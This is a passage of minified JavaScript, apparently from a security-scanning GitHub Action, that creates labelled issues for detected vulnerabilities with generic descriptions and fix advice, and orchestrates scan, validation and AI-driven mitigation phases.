Array.from(J.values()).sort((Q,Y)=>{let W={high:0,medium:1,low:2},z=W[Q.severity]-W[Y.severity];return z!==0?z:Y.count-Q.count})}}i8();t1();class yz{github;constructor(){this.github=c0()}async createIssuesFromGroups(X,J){let Q=[];if(!J.createIssues)return q.info("Issue creation disabled, skipping"),Q;q.info(`Creating issues for ${X.length} vulnerability groups`);for(let Y of X)try{let W=await this.createIssueForGroup(Y,J);Q.push(W),q.info(`Created issue #${W.number} for ${Y.type} vulnerabilities`)}catch(W){q.error(`Failed to create issue for ${Y.type}:`,W)}return Q}async createIssueForGroup(X,J){let Q=this.generateIssueTitle(X),Y=this.generateIssueBody(X,J),W=["rsolv:detected","security",X.severity,"automated-scan"];if(process.env.RSOLV_DEMO_MODE==="true"||process.env.RSOLV_AUTO_FIX==="true")W.push("rsolv:automate"),W.push("demo");let{data:z}=await this.github.issues.create({owner:J.repository.owner,repo:J.repository.name,title:Q,body:Y,labels:W});return{number:z.number,title:z.title,url:z.html_url,vulnerabilityType:X.type,fileCount:X.files.length}}generateIssueTitle(X){let J={"sql-injection":"SQL Injection",xss:"Cross-Site Scripting (XSS)","command-injection":"Command Injection","path-traversal":"Path Traversal","weak-crypto":"Weak Cryptography","hardcoded-secret":"Hardcoded Secrets","insecure-random":"Insecure Random Number Generation","open-redirect":"Open Redirect",xxe:"XML External Entity (XXE)",ssrf:"Server-Side Request Forgery (SSRF)","nosql-injection":"NoSQL Injection","ldap-injection":"LDAP Injection","xpath-injection":"XPath Injection","weak-hash":"Weak Hashing Algorithm","insecure-deserialization":"Insecure Deserialization"},Q=X.type||"security-vulnerability",Y=J[Q]||Q.replace(/-/g," ").replace(/\b\w/g,(G)=>G.toUpperCase()),W=X.files.length;return`\uD83D\uDD12 ${Y} vulnerabilities found in ${W} ${W===1?"file":"files"}`}generateIssueBody(X,J){let Q=[];Q.push("## Security Vulnerability Report"),Q.push("");let Y=X.type||"security-vulnerability";Q.push(`**Type**: ${Y.replace(/-/g," ").replace(/\b\w/g,(z)=>z.toUpperCase())}`),Q.push(`**Severity**: ${X.severity.toUpperCase()}`),Q.push(`**Total Instances**: ${X.count}`),Q.push(`**Affected Files**: ${X.files.length}`),Q.push(""),Q.push("### Description"),Q.push(this.getVulnerabilityDescription(Y)),Q.push(""),Q.push("### Affected Files"),Q.push("");let W=new Map;for(let z of X.vulnerabilities){if(!z.filePath)continue;if(!W.has(z.filePath))W.set(z.filePath,[]);W.get(z.filePath).push(z)}for(let[z,G]of W){Q.push(`#### \`${z}\``),Q.push("");for(let H of G.slice(0,3))if(Q.push(`- **Line ${H.line}**: ${H.description}`),H.snippet)Q.push("  ```"+this.detectLanguageFromPath(z)),Q.push("  "+H.snippet.trim()),Q.push("  ```");if(G.length>3)Q.push(`- ... and ${G.length-3} more instances`);Q.push("")}return Q.push("### Recommendation"),Q.push(this.getVulnerabilityRecommendation(Y)),Q.push(""),Q.push("---"),Q.push("*This issue was automatically generated by RSOLV security scanner*"),Q.push(`*Repository: ${J.repository.owner}/${J.repository.name}*`),Q.push(`*Branch: ${J.repository.defaultBranch}*`),Q.push(`*Scan Date: ${new Date().toISOString()}*`),Q.join(`
`)}getVulnerabilityDescription(X){return{"sql-injection":"SQL injection vulnerabilities occur when user input is directly concatenated into SQL queries without proper sanitization or parameterization. This can allow attackers to execute arbitrary SQL commands.",xss:"Cross-Site Scripting (XSS) vulnerabilities occur when user input is rendered in HTML without proper escaping. This can allow attackers to inject malicious scripts that execute in other users' browsers.","command-injection":"Command injection vulnerabilities occur when user input is passed directly to system commands. This can allow attackers to execute arbitrary system commands on the server.","path-traversal":"Path traversal vulnerabilities occur when user input is used to construct file paths without proper validation. This can allow attackers to access files outside the intended directory.","weak-crypto":"Weak cryptography vulnerabilities occur when outdated or insecure cryptographic algorithms are used. This can make encrypted data vulnerable to decryption by attackers.","hardcoded-secret":"Hardcoded secrets in source code can be exposed if the code is leaked or accessed by unauthorized parties. This includes API keys, passwords, and other sensitive credentials.","insecure-random":"Using insecure random number generators for security-critical operations can make systems predictable and vulnerable to attacks.","open-redirect":"Open redirect vulnerabilities occur when user input is used to construct redirect URLs without validation. This can be used in phishing attacks.",xxe:"XML External Entity (XXE) vulnerabilities occur when XML parsers process external entity references. This can lead to file disclosure, SSRF, or denial of service.",ssrf:"Server-Side Request Forgery (SSRF) vulnerabilities occur when user input is used to make HTTP requests from the server. This can allow access to internal resources.","nosql-injection":"NoSQL injection vulnerabilities occur when user input is used in NoSQL queries without proper sanitization. This can allow attackers to manipulate queries and access unauthorized data.","ldap-injection":"LDAP injection vulnerabilities occur when user input is used in LDAP queries without proper escaping. This can allow attackers to modify LDAP queries and bypass authentication.","xpath-injection":"XPath injection vulnerabilities occur when user input is used in XPath queries without proper sanitization. This can allow attackers to extract sensitive data from XML documents.","weak-hash":"Weak hashing algorithms like MD5 or SHA1 are vulnerable to collision attacks and should not be used for security-critical operations.","insecure-deserialization":"Insecure deserialization vulnerabilities occur when untrusted data is deserialized without proper validation. This can lead to remote code execution."}[X]||"This type of vulnerability can compromise the security of your application."}getVulnerabilityRecommendation(X){return{"sql-injection":"Use parameterized queries or prepared statements instead of string concatenation. Never trust user input and always validate and sanitize it before use in SQL queries.",xss:"Always escape user input before rendering it in HTML. Use context-appropriate escaping functions and consider using a templating engine that provides automatic escaping.","command-injection":"Avoid executing system commands with user input. If necessary, use a whitelist of allowed values and escape shell metacharacters. Consider using language-specific APIs instead of shell commands.","path-traversal":"Validate and sanitize file paths. Use a whitelist of allowed directories and files. Resolve paths to their canonical form and ensure they stay within allowed boundaries.","weak-crypto":"Replace weak cryptographic algorithms with strong, modern alternatives. Use AES for encryption, SHA-256 or better for hashing, and ensure proper key management.","hardcoded-secret":"Remove hardcoded secrets from source code. Use environment variables, secure key management systems, or configuration files that are not committed to version control.","insecure-random":"Use cryptographically secure random number generators (CSPRNGs) for security-critical operations. Most languages provide secure alternatives to standard random functions.","open-redirect":"Validate redirect URLs against a whitelist of allowed domains. Avoid using user input directly in redirect locations.",xxe:"Disable XML external entity processing in XML parsers. Configure parsers to not resolve external entities or DTDs.",ssrf:"Validate and whitelist URLs before making requests. Implement network segmentation to limit access to internal resources.","nosql-injection":"Sanitize and validate user input before using it in NoSQL queries. Use parameterized queries where available and avoid string concatenation.","ldap-injection":"Escape special LDAP characters in user input. Use parameterized LDAP queries and validate input against expected patterns.","xpath-injection":"Use parameterized XPath queries or escape user input properly. Validate input against expected patterns and avoid dynamic query construction.","weak-hash":"Replace MD5 and SHA1 with SHA-256 or better for security operations. For password hashing, use bcrypt, scrypt, or Argon2.","insecure-deserialization":"Avoid deserializing untrusted data. If necessary, use safe serialization formats like JSON and validate the structure before processing."}[X]||"Review and fix the identified vulnerabilities according to security best practices."}detectLanguageFromPath(X){let J=X.substring(X.lastIndexOf("."));return{".js":"javascript",".jsx":"javascript",".ts":"typescript",".tsx":"typescript",".py":"python",".rb":"ruby",".java":"java",".php":"php",".ex":"elixir",".exs":"elixir"}[J]||""}}t1();t1();var Px1=[{name:"rsolv:detected",color:"FBCA04",description:"Issue detected by RSOLV security scan"},{name:"rsolv:validate",color:"0E8A16",description:"Trigger RSOLV validation phase"},{name:"rsolv:automate",color:"0052CC",description:"Trigger RSOLV fix generation"},{name:"security",color:"D93F0B",description:"Security vulnerability"},{name:"automated-scan",color:"C5DEF5",description:"Created by automated security scan"},{name:"critical",color:"B60205",description:"Critical severity"},{name:"high",color:"D93F0B",description:"High severity"},{name:"medium",color:"FBCA04",description:"Medium severity"},{name:"low",color:"0E8A16",description:"Low severity"}];async function dA(X,J,Q){q.info("Ensuring required labels exist...");try{let Y=await Sx1(X,J,Q);if(!Y)return;await Tx1(X,J,Q,Y),q.info("Label check complete")}catch(Y){q.error("Failed to ensure labels exist",Y)}}async function Sx1(X,J,Q){let Y=await fetch(`https://api.github.com/repos/${X}/${J}/labels`,{headers:iA(Q)});if(!Y.ok)return q.warn(`Failed to fetch labels: ${Y.status}. Skipping label creation.`),null;let W=await Y.json();return new Set(W.map((z)=>z.name.toLowerCase()))}async function Tx1(X,J,Q,Y){let W=Px1.filter((z)=>!Y.has(z.name.toLowerCase()));for(let z of W)await _x1(X,J,Q,z)}async function _x1(X,J,Q,Y){q.info(`Creating missing label: ${Y.name}`);let W=await fetch(`https://api.github.com/repos/${X}/${J}/labels`,{method:"POST",headers:iA(Q),body:JSON.stringify(Y)});if(!W.ok){let z=await W.text();q.warn(`Failed to create label ${Y.name}: ${z}`)}else q.info(` Created label: ${Y.name}`)}function iA(X){return{Authorization:`token ${X}`,Accept:"application/vnd.github.v3+json","Content-Type":"application/json"}}class z2{scanner;issueCreator;constructor(){this.scanner=new hz,this.issueCreator=new yz}async performScan(X){q.info("Starting proactive security scan");try{if(X.createIssues&&process.env.GITHUB_TOKEN)await dA(X.repository.owner,X.repository.name,process.env.GITHUB_TOKEN);let J=await this.scanner.scan(X);if(X.createIssues&&J.groupedVulnerabilities.length>0){q.info(`Creating issues for ${J.groupedVulnerabilities.length} vulnerability groups`);let Q=await this.issueCreator.createIssuesFromGroups(J.groupedVulnerabilities,X);J.createdIssues=Q,q.info(`Created ${Q.length} issues`)}return this.logScanSummary(J),J}catch(J){throw q.error("Scan failed:",J),J}}logScanSummary(X){if(q.info(""),q.info("=== SECURITY SCAN SUMMARY ==="),q.info(`Repository: ${X.repository}`),q.info(`Branch: ${X.branch}`),q.info(`Files scanned: ${X.scannedFiles}/${X.totalFiles}`),q.info(`Total vulnerabilities: ${X.vulnerabilities.length}`),q.info(""),X.groupedVulnerabilities.length>0){q.info("Vulnerabilities by type:");for(let J of X.groupedVulnerabilities)q.info(`  - ${J.type} (${J.severity}): ${J.count} instances in ${J.files.length} files`);q.info("")}if(X.createdIssues.length>0){q.info("Created issues:");for(let J of X.createdIssues)q.info(`  - #${J.number}: ${J.title}`),q.info(`    ${J.url}`);q.info("")}q.info("=============================")}}G7();U2();V2();u2();J3();Q3();t1();import{execSync as m7}from"child_process";class S3{phaseDataClient;scanner;config;testGenerator;fixer;constructor(X){this.config=X,this.phaseDataClient=new fY(X.rsolvApiKey||X.apiKey||"",process.env.RSOLV_API_URL)}getScanner(){if(!this.scanner)this.scanner=new z2;return this.scanner}async execute(X,J){switch(q.info(`Executing in ${X} mode`,J),X){case"scan":return this.executeScan(J);case"validate":if(J.issues&&J.issues.length>0)return this.executeValidateStandalone(J);else if(J.issueNumber||J.scanData)return this.executeValidate(J);else{q.info("[VALIDATE] No specific issues provided, detecting issues by label");let Q=this.config.maxIssues||5;q.info(`[VALIDATE] Detecting up to ${Q} issues with label '${this.config.issueLabel}'`);let{detectIssuesFromAllPlatforms:Y}=await Promise.resolve().then(() => (gD(),fD)),W=await Y({...this.config,maxIssues:Q});if(W.length===0)throw new Error(`No issues found with label '${this.config.issueLabel}'`);return q.info(`[VALIDATE] Found ${W.length} issues to validate (limited by max_issues: ${Q})`),this.executeValidateStandalone({...J,issues:W})}case"mitigate":return this.executeMitigate(J);case"full":return this.executeAllPhases(J);default:throw new Error(`Unknown mode: ${X}`)}}async executeScan(X){try{let J=X.repository;if(!J&&X.issues&&X.issues.length>0)J=X.issues[0].repository;if(!J)throw new Error("Scan mode requires repository information");if(X.issues&&X.issues.length>0){let W={canBeFixed:!0,vulnerabilities:[],timestamp:new Date().toISOString(),commitHash:await this.getCurrentCommitSha()};for(let z of X.issues)try{let G=await this.executeScanForIssue(z);if(G.success&&G.data){if(W.vulnerabilities.push({issueNumber:z.number,...G.data}),!G.data.canBeFixed)W.canBeFixed=!1}}catch(G){q.warn(`Failed to scan issue #${z.number}:`,G)}return await this.storePhaseData("scan",W,{repo:`${J.owner}/${J.name}`,commitSha:W.commitHash}),{success:!0,phase:"scan",data:{scan:W}}}let Q=await this.getScanner().performScan({mode:"scan",repository:{...J,defaultBranch:J.defaultBranch||"main"},createIssues:!0,batchSimilar:!0,issueLabel:this.config.issueLabel||"rsolv:automate",enableASTValidation:process.env.RSOLV_ENABLE_AST_VALIDATION!=="false",rsolvApiKey:this.config.apiKey}),Y=X.commitSha||this.getCurrentCommitSha();return await this.storePhaseData("scan",Q,{repo:`${J.owner}/${J.name}`,commitSha:Y}),{success:!0,phase:"scan",message:`Found ${Q.vulnerabilities.length} vulnerabilities`,data:{scan:Q}}}catch(J){return q.error("Scan phase failed",J),{success:!1,phase:"scan",error:J instanceof Error?J.message:String(J)}}}async executeValidate(X){try{if(q.info("[VALIDATE] Starting RFC-058 validation phase with ValidationMode"),!X.issueNumber||!X.repository)return{success:!1,phase:"validate",error:"Validation requires an issue number and repository"};let{getIssue:J}=await Promise.resolve().then(() => (i8(),xY)),Q=await J(X.repository.owner,X.repository.name,X.issueNumber);if(!Q)return{success:!1,phase:"validate",error:`Issue #${X.issueNumber} not found`};let Y={id:`issue-${Q.number}`,number:Q.number,title:Q.title,body:Q.body||"",labels:Q.labels?.map((K)=>typeof K==="string"?K:K.name)||[],assignees:Q.assignees?.map((K)=>K.login)||[],repository:{owner:X.repository.owner,name:X.repository.name,fullName:`${X.repository.owner}/${X.repository.name}`,defaultBranch:X.repository.defaultBranch||"main"},source:"github",createdAt:Q.created_at||new Date().toISOString(),updatedAt:Q.updated_at||new Date().toISOString(),metadata:{}},{ValidationMode:W}=await Promise.resolve().then(() => (H3(),z3)),z=new W(this.config,process.cwd());q.info(`[VALIDATE] Using ValidationMode for RFC-058 validation of issue #${X.issueNumber}`);let G=await z.validateVulnerability(Y);if(!G.validated){q.info(`[VALIDATE] Issue #${X.issueNumber} failed validation: ${G.falsePositiveReason}`);let K=X.commitSha||this.getCurrentCommitSha();return await this.storePhaseData("validation",{[`issue-${X.issueNumber}`]:{issueNumber:G.issueId,validated:!1,falsePositiveReason:G.falsePositiveReason,timestamp:G.timestamp,commitHash:G.commitHash}},{repo:`${X.repository.owner}/${X.repository.name}`,issueNumber:X.issueNumber,commitSha:K}),{success:!0,phase:"validate",message:`Issue #${X.issueNumber} identified as false positive: ${G.falsePositiveReason}`,data:{validation:{issueNumber:G.issueId,validated:!1,falsePositiveReason:G.falsePositiveReason,timestamp:G.timestamp}}}}if(q.info(`[VALIDATE]  Issue #${X.issueNumber} validated successfully with ValidationMode`),G.branchName)q.info(`[VALIDATE]  RFC-058: Tests committed to validation branch: ${G.branchName}`);let H=X.commitSha||this.getCurrentCommitSha(),U={issueNumber:G.issueId,validated:!0,branchName:G.branchName,redTests:G.redTests,testResults:G.testResults,timestamp:G.timestamp,commitHash:G.commitHash,hasSpecificVulnerabilities:!0,vulnerabilities:[],confidence:"high"};return await this.storePhaseData("validation",{[`issue-${X.issueNumber}`]:U},{repo:`${X.repository.owner}/${X.repository.name}`,issueNumber:X.issueNumber,commitSha:H}),{success:!0,phase:"validate",message:G.branchName?`Validated issue #${X.issueNumber} with RFC-058 branch persistence: ${G.branchName}`:`Validated issue #${X.issueNumber} with RED tests`,data:{validation:U,rfc058Enabled:!!G.branchName}}}catch(J){return q.error("Validation phase failed",J),{success:!1,phase:"validate",error:J instanceof Error?J.message:String(J)}}}async executeMitigate(X){let J=Date.now(),Q=1800000;if(process.env.AI_TIMEOUT_OVERRIDE)Q=parseInt(process.env.AI_TIMEOUT_OVERRIDE,10),q.info(`[MITIGATE] Using timeout override: ${Q}ms`);try{if(q.info("[MITIGATE] Starting enhanced mitigation phase",{issueNumber:X.issueNumber,repository:X.repository,timestamp:new Date().toISOString(),initialTimeout:Q}),!X.issueNumber||!X.repository)return q.error("[MITIGATE] Missing required parameters"),{success:!1,phase:"mitigate",error:"Mitigation requires an issue number and repository"};q.info("[MITIGATE] Step 1: Fetching issue from GitHub...");let{getIssue:Y}=await Promise.resolve().then(() => (i8(),xY)),W=Y(X.repository.owner,X.repository.name,X.issueNumber),z=new Promise((n,r)=>setTimeout(()=>r(new Error("GitHub API timeout after 30s")),30000)),G;try{G=await Promise.race([W,z]),q.info("[MITIGATE] Step 1 complete: Successfully fetched issue from GitHub")}catch(n){return q.error("[MITIGATE] Step 1 failed: Error fetching issue from GitHub:",n),{success:!1,phase:"mitigate",error:`Failed to fetch issue: ${n instanceof Error?n.message:String(n)}`}}if(!G)return{success:!1,phase:"mitigate",error:`Issue #${X.issueNumber} not found`};q.info("[MITIGATE] Analyzing issue for file count...");let H=G.body||"",U=G.title||"",K=1,V=U.match(/(\d+)\s+files?/i)||H.match(/(\d+)\s+files?/i);if(V)K=parseInt(V[1],10),q.info(`[MITIGATE] Detected ${K} files from issue description`);if(K>3){let r=Math.max(Q,K*60000);q.info(`[MITIGATE] Adjusting timeout for ${K} files: ${Q}ms -> ${r}ms`),Q=r}q.info("[MITIGATE] Step 2: Retrieving validation data...");let B=X.commitSha||this.getCurrentCommitSha(),Z;try{let n=this.phaseDataClient.retrievePhaseResults(`${X.repository.owner}/${X.repository.name}`,X.issueNumber,B),r=new Promise((G1,$1)=>setTimeout(()=>$1(new Error("Phase data retrieval timeout after 15s")),15000));Z=await Promise.race([n,r]),q.info("[MITIGATE] Step 2 complete: Retrieved validation data",{hasData:!!Z,keys:Z?Object.keys(Z):[]})}catch(n){q.warn("[MITIGATE] Step 2 warning: Failed to retrieve validation data:",n),Z=null}q.info("[MITIGATE] Checking labels...",{labels:G.labels,labelType:typeof G.labels,isArray:Array.isArray(G.labels)});let M=Array.isArray(G.labels)?G.labels.map((n)=>typeof n==="string"?n:n.name||""):[],F=M.includes("rsolv:automate"),j=M.includes("rsolv:validated");if(q.info("[MITIGATE] Label check complete",{labelNames:M,hasAutomateLabel:F,hasValidatedLabel:j}),!Z?.validation&&F&&!j){q.info("[MITIGATE] Step 3: No validation found, running VALIDATE phase first");try{let n=this.executeValidate(X),r=new Promise((t,Y1)=>setTimeout(()=>Y1(new Error("Validation timeout after 60s")),60000)),G1=await Promise.race([n,r]);if(!G1.success)return q.error("[MITIGATE] Step 3 failed: Auto-validation failed"),{success:!1,phase:"mitigate",error:`Auto-validation failed: ${G1.error}`,data:{validationAttempted:!0}};q.info("[MITIGATE] Step 3a: Validation succeeded, retrieving stored data...");let $1=this.phaseDataClient.retrievePhaseResults(`${X.repository.owner}/${X.repository.name}`,X.issueNumber,B),m1=new Promise((t,Y1)=>setTimeout(()=>Y1(new Error("Phase data retrieval timeout after 15s")),15000));Z=await Promise.race([$1,m1]),q.info("[MITIGATE] Step 3 complete: Validation data retrieved")}catch(n){return q.error("[MITIGATE] Step 3 failed:",n),{success:!1,phase:"mitigate",error:`Validation phase error: ${n instanceof Error?n.message:String(n)}`,data:{validationError:!0}}}}q.info("[MITIGATE] Step 4: Checking validation data...");let O;try{let n=`issue-${X.issueNumber}`;q.info("[MITIGATE] Looking for validation with key:",n),q.info("[MITIGATE] Available validation data:",{hasValidationData:!!Z,validationKeys:Z?Object.keys(Z):[],validationProp:Z?.validation?Object.keys(Z.validation):[],validateProp:Z?.validate?Object.keys(Z.validate):[]}),O=Z?.validation?.[n]||Z?.validate?.[n],q.info("[MITIGATE] Validation lookup result:",{found:!!O,validationType:O?typeof O:"undefined"})}catch(n){return q.error("[MITIGATE] Error accessing validation data:",n),{success:!1,phase:"mitigate",error:`Failed to access validation data: ${n instanceof Error?n.message:String(n)}`,data:{validationAccessError:!0}}}if(!O||typeof O!=="object")return q.warn("[MITIGATE] No validation data found for issue or invalid type",{validationType:typeof O,validation:O}),{success:!1,phase:"mitigate",error:"No validation data available. Please run validation first or add rsolv:automate label.",data:{validationRequired:!0}};q.info("[MITIGATE] Step 4 complete: Validation data found"),q.info("[MITIGATE DEBUG] Validation data structure:",JSON.stringify(O,null,2));let N=O,A=N.hasSpecificVulnerabilities??(N.vulnerabilities&&N.vulnerabilities.length>0);if(q.info("[MITIGATE DEBUG] Vulnerability check:",{hasSpecificVulnerabilities:A,hasSpecificVulnerabilitiesField:"hasSpecificVulnerabilities"in N,vulnerabilitiesLength:N.vulnerabilities?.length||0,validationKeys:Object.keys(N)}),!A)return q.warn("[MITIGATE] No specific vulnerabilities found - validation may have failed"),q.warn("[MITIGATE DEBUG] Validation object:",O),{success:!1,phase:"mitigate",error:"No specific vulnerabilities found during validation. This may be a false positive.",data:{validation:O,falsePositive:!0}};let D=N.vulnerabilities||[],S=N.overallConfidence||N.confidence||"medium";q.info("[MITIGATE] DEBUG: Vulnerability data structure:",{vulnerabilityCount:D.length,firstVulnerability:D[0]?JSON.stringify(D[0]):"none",vulnerabilityKeys:D[0]?Object.keys(D[0]):[],validationKeys:Object.keys(N)}),q.info("[MITIGATE] Step 4a: Parsing issue body to extract real filenames...");let{parseIssueBody:$,enhanceValidationData:T}=await Promise.resolve().then(() => (mD(),yD)),k=$(H);if(D.length>0&&k.files.length>0)D=T(N,k).vulnerabilities,q.info("[MITIGATE] Step 4a complete: Enhanced validation data with real filenames",{originalFiles:N.vulnerabilities?.map((r)=>r.filePath||r.file)||[],enhancedFiles:D.map((r)=>r.filePath||r.file),filesFixed:D.filter((r,G1)=>r.file!==N.vulnerabilities?.[G1]?.file).length});else q.warn("[MITIGATE] Step 4a: Could not enhance validation data",{hasVulnerabilities:D.length>0,hasParsedFiles:k.files.length>0});if(S==="review"||S==="low")q.warn(`[MITIGATE] Low confidence (${S}) - requiring manual review`);let E={...G,validationData:O,specificVulnerabilities:D};q.info("[MITIGATE] Step 5: Checking for vendor files and multi-file vulnerabilities...");let{ChunkingIntegration:y}=await Promise.resolve().then(() => (Z3(),iD)),{VendorDetectionIntegration:a}=await Promise.resolve().then(() => (sD(),aD)),{ExtendedConversationIntegration:p}=await Promise.resolve().then(() => tD),f=process.env.USE_EXTENDED_CONVERSATION!=="false",m=f?new p:new y,o=new a,{extractFilesFromVulnerabilities:J1}=await Promise.resolve().then(() => (Jw(),Xw)),H1=J1(D,"MITIGATE");if(H1.length>3)Q=Math.max(Q,H1.length*60000),q.info(`[MITIGATE] Adjusted timeout for ${H1.length} files: ${Q}ms`);let d=await Promise.all(H1.map(async(n)=>({file:n,isVendor:await o.isVendorFile(n)})));if(q.info("[MITIGATE] Vendor detection results:",{totalFiles:H1.length,vendorFiles:d.filter((n)=>n.isVendor).map((n)=>n.file),nonVendorFiles:d.filter((n)=>!n.isVendor).map((n)=>n.file)}),d.some((n)=>n.isVendor)){q.info("[MITIGATE] RFC-047: Vendor files detected, handling as vendor vulnerability");let n=await o.processVulnerability({...E,files:H1,vendorFiles:d.filter((r)=>r.isVendor).map((r)=>r.file)});if(n.action==="issue_created")return{success:!0,phase:"mitigate",message:"Vendor library vulnerability detected. Update recommendation created instead of patch.",data:n}}let u=H1.length;if(f?m.shouldUseExtendedConversation({files:H1,vulnerabilities:D}):m.shouldChunk({files:H1,vulnerabilities:D})){let n=f?"extended conversation":"chunking";q.info(`[MITIGATE] RFC-046: Multi-file vulnerability (${u} files) will use ${n}`);let G1=await m[f?"processWithExtendedConversation":"processWithChunking"]({...E,files:H1,type:D[0]?.type||"UNKNOWN"},X.issueNumber);if(G1.success||G1.chunked)return{success:!0,phase:"mitigate",message:f?"Multi-file vulnerability fixed in single PR using extended conversation":`Multi-file vulnerability chunked into ${G1.chunks} PRs for manageable fixes`,data:G1};if(G1.requiresManual)return{success:!1,phase:"mitigate",error:"Vulnerability too complex for automated fixing",data:{...G1,manualGuide:G1.guide}}}q.info("[MITIGATE] Step 4: Checking for RFC-058 validation branch...");let{MitigationMode:B1}=await Promise.resolve().then(() => (Ww(),Yw)),N1=new B1(this.config),i1=!1;try{q.info("[MITIGATE] Fetching remote branches for RFC-058 validation branches...");let{execSync:n}=await import("child_process");try{n("git fetch origin",{cwd:process.cwd(),encoding:"utf8"}),q.info("[MITIGATE] Remote branches fetched successfully")}catch(G1){q.warn("[MITIGATE] Could not fetch remote branches:",G1)}let r=`rsolv/validate/issue-${X.issueNumber}`;try{n(`git rev-parse --verify origin/${r}`,{cwd:process.cwd()}),i1=!0,q.info(`[MITIGATE] RFC-058: Validation branch found: origin/${r}`)}catch{q.info("[MITIGATE] No validation branch found, using standard mitigation")}}catch(n){q.warn("[MITIGATE] Error checking for validation branch:",n)}if(i1){q.info("[MITIGATE] RFC-058: Using test-aware fix generation with validation tests");let n=await N1.generateTestAwareFix(G);q.info("[MITIGATE] Test-aware context generated:",{branchCheckedOut:n.branchCheckedOut,testFilesFound:n.testFilesFound}),E.testContext=n,E.hasValidationTests=n.testFilesFound>0,E.validationBranch=n.branchCheckedOut?N1.getCurrentBranch():void 0}if(q.info(`[MITIGATE] Generating fix for ${D.length} validated vulnerabilities`),this.config.aiProvider?.useVendedCredentials&&!this.config.rsolvApiKey)return q.error("[MITIGATE] Vended credentials enabled but RSOLV_API_KEY is missing"),{success:!1,phase:"mitigate",error:"RSOLV_API_KEY is required for vended credentials but was not provided",data:{credentialError:!0}};q.info("[MITIGATE] Step 4: Importing AI processor...");let{processIssues:d1}=await Promise.resolve().then(() => (Nw(),Aw));q.info("[MITIGATE] Step 4 complete: AI processor imported successfully");let X0=Date.now()-J,b1=Q-X0;if(b1<=0)return q.error("[MITIGATE] Overall timeout exceeded before processing"),{success:!1,phase:"mitigate",error:"Mitigation timeout exceeded",data:{timeout:!0,elapsed:X0}};q.info("[MITIGATE] Step 5: Starting AI processing...",{remainingTime:Math.round(b1/1000)+"s",vulnerabilityCount:D.length,hasVendedCredentials:this.config.aiProvider?.useVendedCredentials,hasRsolvApiKey:!!this.config.rsolvApiKey});let S1;try{let n=d1([E],this.config),r=new Promise((G1,$1)=>setTimeout(()=>$1(new Error(`AI processing timeout after ${Math.round(b1/1000)}s`)),b1));S1=await Promise.race([n,r]),q.info("[MITIGATE] Step 5 complete: AI processing finished",{hasResults:!!S1,resultCount:S1?.length||0,firstResult:S1?.[0]?Object.keys(S1[0]):[]})}catch(n){return q.error("[MITIGATE] Step 5 failed: Error during processIssues:",n),{success:!1,phase:"mitigate",error:`Failed to process issue: ${n instanceof Error?n.message:String(n)}`,data:{processingError:!0,elapsed:Date.now()-J}}}let g=`issue-${X.issueNumber}`,X1;if(S1&&S1.length>0&&S1[0].pullRequestUrl){let n=S1[0];X1={fixed:!0,prUrl:n.pullRequestUrl,prNumber:n.pullRequestUrl?parseInt(n.pullRequestUrl.split("/").pop()||"0"):0,filesModified:[],vulnerabilitiesFixed:D.length,usedValidationData:!0,validationConfidence:S,timestamp:new Date().toISOString()}}else{let n=S1?.[0]?.error||S1?.[0]?.message||"Unknown error during fix generation";return q.error("[MITIGATE] Failed to generate fix",{error:n,result:S1?.[0],hasResult:S1?.length>0}),{success:!1,phase:"mitigate",error:`Failed to generate fix: ${n}`,data:{processingResults:S1,validation:O}}}q.info("[MITIGATE] Step 6: Storing mitigation results...");try{let n=this.storePhaseData("mitigation",{[g]:X1},{repo:`${X.repository.owner}/${X.repository.name}`,issueNumber:X.issueNumber,commitSha:B}),r=new Promise((G1,$1)=>setTimeout(()=>$1(new Error("Store timeout after 10s")),1e4));await Promise.race([n,r]),q.info("[MITIGATE] Step 6 complete: Mitigation results stored")}catch(n){q.warn("[MITIGATE] Step 6 warning: Failed to store results (non-fatal):",n)}let V1=Date.now()-J;return q.info("[MITIGATE] SUCCESS: Mitigation completed",{prUrl:X1.prUrl,vulnerabilitiesFixed:X1.vulnerabilitiesFixed,totalTimeMs:V1,totalTimeSec:Math.round(V1/1000)}),{success:!0,phase:"mitigate",message:`Fixed ${X1.vulnerabilitiesFixed} vulnerabilities and created PR`,data:{mitigation:X1,validationUsed:!0,executionTimeMs:V1}}}catch(Y){let W=Date.now()-J;return q.error("[MITIGATE] FAILED: Mitigation phase failed",{error:Y instanceof Error?Y.message:String(Y),stack:Y instanceof Error?Y.stack:void 0,totalTimeMs:W,totalTimeSec:Math.round(W/1000)}),{success:!1,phase:"mitigate",error:Y instanceof Error?Y.message:String(Y),data:{executionTimeMs:W,errorDetails:Y instanceof Error?Y.stack:String(Y)}}}}async executeAllPhases(X){try{q.info("Executing all phases: scan, validate, mitigate");let J=await this.executeScan(X);if(!J.success)return J;let Q=J.data?.scan?.vulnerabilities||[],Y=[];for(let z of Q){let G=await this.executeValidate({...X,scanData:z});Y.push(G)}let W=[];for(let z of Y)if(z.success&&z.data?.validation?.validated){let G=await this.executeMitigate({...X});W.push(G)}return{success:!0,phase:"full",message:`Completed all phases: ${Q.length} scanned, ${Y.length} validated, ${W.length} mitigated`,data:{scan:J.data,validations:Y,mitigations:W}}}catch(J){return q.error("Full execution failed",J),{success:!1,phase:"full",error:J instanceof Error?J.message:String(J)}}}async storePhaseData(X,J,Q){let Y={};if(X==="scan")Y.scan={vulnerabilities:J.vulnerabilities||[],timestamp:new Date().toISOString(),commitHash:Q.commitSha};else if(X==="validation")Y.validation=J;else if(X==="mitigation")Y.mitigation=J;await this.phaseDataClient.storePhaseResults(X==="validation"?"validate":X==="mitigation"?"mitigate":X,Y,Q)}async retrievePhaseData(X,J,Q){return this.phaseDataClient.retrievePhaseResults(X,J,Q)}getCurrentCommitSha(){return m7("git rev-parse HEAD",{encoding:"utf-8"}).trim()}async executeScanForIssue(X){try{q.info(`[SCAN] Analyzing issue #${X.number}`);let J=this.checkGitStatus();if(!J.clean)return{success:!1,phase:"scan",message:"Repository has uncommitted changes",error:`Uncommitted changes in: ${J.modifiedFiles.join(", ")}`};let Q=await X6(X,this.config);if(!Q)return{success:!1,phase:"scan",message:"Failed to analyze issue",error:"Analysis returned no data"};let Y={vulnerabilities:[],timestamp:new Date().toISOString(),commitHash:this.getCurrentCommitSha(),canBeFixed:Q.canBeFixed||!1,analysisData:Q,gitStatus:J},W=this.getCurrentCommitSha();return await this.phaseDataClient.storePhaseResults("scan",{scan:Y},{repo:`${X.repository.owner}/${X.repository.name}`,issueNumber:X.number,commitSha:W}),{success:!0,phase:"scan",message:Q.canBeFixed?"Issue can be automatically fixed":"Issue cannot be automatically 